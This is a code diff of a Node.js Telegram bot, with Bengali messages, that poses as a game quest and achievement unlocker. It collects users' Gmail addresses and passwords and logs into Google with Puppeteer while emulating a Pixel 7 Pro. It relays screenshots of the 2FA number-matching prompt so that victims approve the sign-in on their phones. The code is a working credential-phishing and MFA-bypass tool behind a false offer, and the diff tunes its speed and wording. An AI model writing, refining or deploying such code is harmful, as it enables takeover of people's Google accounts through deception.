@@ -14,7 +14,7 @@ app.get('/', (req, res) => res.send('🔥 PP MOD 2FA Auto-Unlocker Engine Runnin
 app.listen(PORT, () => console.log(`[+] Server running on port ${PORT}`));
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-console.log('🔥 PP MOD Telegram Bot Started with Pixel 7 Pro Emulation!');
+console.log('🔥 PP MOD Telegram Bot Started (Fast DOM Engine)!');
 
 // ১. /start কমান্ড
 bot.onText(/\/start/, (msg) => {
@@ -23,12 +23,12 @@ bot.onText(/\/start/, (msg) => {
         `🔥 **PP MOD Auto Quest & Achievement Unlocker**-এ স্বাগতম!\n\n` +
         `লগইন করতে আপনার **ইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে** এক মেসেজে পাঠান:\n\n` +
         `👉 উদাহরণ: \`mdd145712@gmail.com your_password\`\n\n` +
-        `*(Pixel 7 Pro এমুলেশন চালু আছে, ফোনে সরাসরি নোটিফিকেশন আসবে)*`;
+        `*(Pixel 7 Pro এমুলেশন চালু আছে)*`;
 
     bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' });
 });
 
-// ২. ইমেইল ও পাসওয়ার্ড একসাথে রিসিভ করা
+// ২. ইমেইল ও পাসওয়ার্ড রিসিভ করা
 bot.on('message', async (msg) => {
     const text = msg.text ? msg.text.trim() : '';
     const chatId = msg.chat.id;
@@ -37,18 +37,18 @@ bot.on('message', async (msg) => {
 
     const parts = text.split(/\s+/);
     if (parts.length < 2 || !parts[0].includes('@gmail.com')) {
-        return bot.sendMessage(chatId, '❌ **ভুল ফরম্যাট!**\nইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে একসাথে লিখুন।\n\nউদাহরণ:\n`mdd145712@gmail.com your_password`', { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, '❌ **ভুল ফরম্যাট!**\nইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে লিখুন।\n\nউদাহরণ:\n`mdd145712@gmail.com your_password`', { parse_mode: 'Markdown' });
     }
 
     const email = parts[0];
     const password = parts.slice(1).join(' ');
 
-    const statusMsg = await bot.sendMessage(chatId, `⏳ **PP MOD Engine:** Pixel 7 Pro ডিভাইস চালু হচ্ছে...\n📧 ইমেইল: \`${email}\`\n\nগুগলে লগইন করা হচ্ছে, অনুগ্রহ করে ১০-১৫ সেকেন্ড অপেক্ষা করুন।`, { parse_mode: 'Markdown' });
+    const statusMsg = await bot.sendMessage(chatId, `⏳ **PP MOD Engine:** ব্রাউজার চালু হচ্ছে...\n📧 ইমেইল: \`${email}\``, { parse_mode: 'Markdown' });
 
     startGoogleAutomation(chatId, email, password, statusMsg.message_id);
 });
 
-// ৩. গুগল ব্রাউজার অটোমেশন (সাদা স্ক্রিন ফিক্সড)
+// ৩. সুপার-ফাস্ট গুগল অটোমেশন
 async function startGoogleAutomation(chatId, email, password, statusMsgId) {
     let browser;
     try {
@@ -65,39 +65,42 @@ async function startGoogleAutomation(chatId, email, password, statusMsgId) {
 
         const page = await browser.newPage();
 
-        // 📱 Google Pixel 7 Pro Device Emulation
+        // Pixel 7 Pro মোবাইল এমুলেশন
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');
         await page.setViewport({ width: 412, height: 915, isMobile: true, hasTouch: true });
 
-        // গুগলের সরাসরি লগইন পেজে যাওয়া
-        await page.goto('https://accounts.google.com/ServiceLogin?service=mail', { waitUntil: 'networkidle2', timeout: 35000 });
+        // ১. সরাসরি ফাস্ট লোডিং
+        await page.goto('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', { waitUntil: 'domcontentloaded', timeout: 25000 });
+        await new Promise(r => setTimeout(r, 2000));
 
-        // ১. ইমেইল টাইপ
-        await page.waitForSelector('input[type="email"]', { timeout: 15000 });
-        await page.type('input[type="email"]', email, { delay: 50 });
+        // ২. ইমেইল টাইপ
+        await page.waitForSelector('input[type="email"]', { timeout: 10000 });
+        await page.type('input[type="email"]', email, { delay: 40 });
         await page.keyboard.press('Enter');
 
-        // ২. পাসওয়ার্ড পেজ আসা পর্যন্ত অপেক্ষা
-        await new Promise(r => setTimeout(r, 3000));
+        await bot.editMessageText('⏳ ইমেইল সাবমিট হয়েছে... পাসওয়ার্ড দেওয়া হচ্ছে...', { chat_id: chatId, message_id: statusMsgId });
+
+        // ৩. পাসওয়ার্ড টাইপ
+        await new Promise(r => setTimeout(r, 2500));
         await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
-        await page.type('input[type="password"]', password, { delay: 50 });
+        await page.type('input[type="password"]', password, { delay: 40 });
         await page.keyboard.press('Enter');
 
-        // ৩. 2FA নোটিফিকেশন লোড হওয়ার জন্য অপেক্ষা
-        await new Promise(r => setTimeout(r, 5000));
+        await bot.editMessageText('⏳ পাসওয়ার্ড সাবমিট হয়েছে! গুগলের ভেরিফিকেশন চেক করা হচ্ছে...', { chat_id: chatId, message_id: statusMsgId });
 
-        // 📸 লাইভ স্ক্রিনশট তুলে টেলিগ্রামে পাঠানো
+        // ৪. ২-৩ সেকেন্ড অপেক্ষা করে লাইভ স্ক্রিনশট ক্যাপচার
+        await new Promise(r => setTimeout(r, 4000));
+
         const screenshotBuffer = await page.screenshot({ type: 'png' });
         await bot.sendPhoto(chatId, screenshotBuffer, {
-            caption: '🔔 **গুগল ভেরিফিকেশন পেজ!**\n\nআপনার ফোনে আসা গুগল নোটিফিকেশনে এই ছবির কোড/নাম্বারে চাপ দিন!\n*(৩০ সেকেন্ড সময় পাবেন)*',
+            caption: '🔔 **গুগল ভেরিফিকেশন স্ক্রিন!**\n\nআপনার ফোনে আসা নোটিফিকেশনে ছবির সাথে মিল থাকা নাম্বারে চাপ দিন!\n*(৩০ সেকেন্ড সময় পাবেন)*',
             parse_mode: 'Markdown'
         });
 
-        // ৪. ইউজার ফোনে অনুমোদন করার জন্য অপেক্ষা করা (Max 35s)
-        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 35000 });
+        // ৫. ইউজার ফোনে অনুমোদন করার অপেক্ষা
+        await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 35000 });
 
-        // ৫. লগইন সফল!
-        await bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে গেমের সমস্ত কোয়েস্ট আনলক করা হচ্ছে...', { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে কোয়েস্ট আনলক সম্পন্ন করা হচ্ছে...', { parse_mode: 'Markdown' });
 
         await new Promise(r => setTimeout(r, 3000));
 
@@ -111,19 +114,19 @@ async function startGoogleAutomation(chatId, email, password, statusMsgId) {
         );
 
     } catch (error) {
-        console.error('Error during automation:', error);
+        console.error('Error:', error.message);
         
         try {
             if (browser) {
                 const pages = await browser.pages();
                 if (pages.length > 0) {
                     const errPic = await pages[0].screenshot({ type: 'png' });
-                    await bot.sendPhoto(chatId, errPic, { caption: '❌ **লগইন আটকে গেছে!** গুগল বর্তমানে এই স্ক্রিন দেখাচ্ছে:' });
+                    await bot.sendPhoto(chatId, errPic, { caption: '❌ **লগইন আটকে গেছে!** গুগল পেজে এটি দেখাচ্ছে:' });
                 }
             }
         } catch (e) {}
 
-        bot.sendMessage(chatId, `❌ **লগইন সম্পন্ন হয়নি!**\nঅনুগ্রহ করে পাসওয়ার্ড চেক করুন অথবা ফোনে সময়মতো নাম্বারে চাপ দিন। আবার চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `❌ **লগইন সম্পন্ন হয়নি!**\nকারণ: পাসওয়ার্ড ভুল অথবা গুগল পেজে ভেরিফিকেশন আটকে গেছে। পুনরায় চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
     } finally {
         if (browser) await browser.close();
     }
